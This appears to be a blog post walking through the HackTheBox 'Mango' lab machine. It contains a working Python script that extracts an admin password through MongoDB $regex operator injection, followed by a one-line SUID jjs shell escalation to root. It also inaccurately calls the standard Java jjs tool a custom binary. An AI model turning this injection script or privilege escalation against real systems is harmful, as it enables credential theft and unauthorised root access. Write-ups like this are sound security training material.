---
layout: post
title: "HTB: Mango — NoSQL Blind Injection + SUID Privesc"
description: "Extracting credentials character by character via MongoDB operator injection, then escalating through a custom SUID binary."
date: 2026-11-02
category: ctf
tags: [htb, nosql, privesc]
---

## Recon

An nmap scan reveals ports `22`, `80`, and `443`. The SSL certificate leaks a second virtual host: `staging-order.mango.htb`.

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.162
```

## NoSQL Injection

The login form at `/login.php` is vulnerable to NoSQL injection. Using MongoDB's `$regex` operator we can extract credentials one character at a time.

```python
import requests, string

url = "http://staging-order.mango.htb/"
found = ""

for _ in range(32):
    for c in string.printable:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{found}{c}",
            "login": "login"
        }
        r = requests.post(url, data=payload, allow_redirects=False)
        if r.status_code == 302:
            found += c
            break

print("password:", found)
```

## Privilege Escalation

A custom binary at `/usr/bin/jjs` has the SUID bit set. It executes JavaScript — which lets us spawn a shell as root.

```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -c ...')" | jjs
```
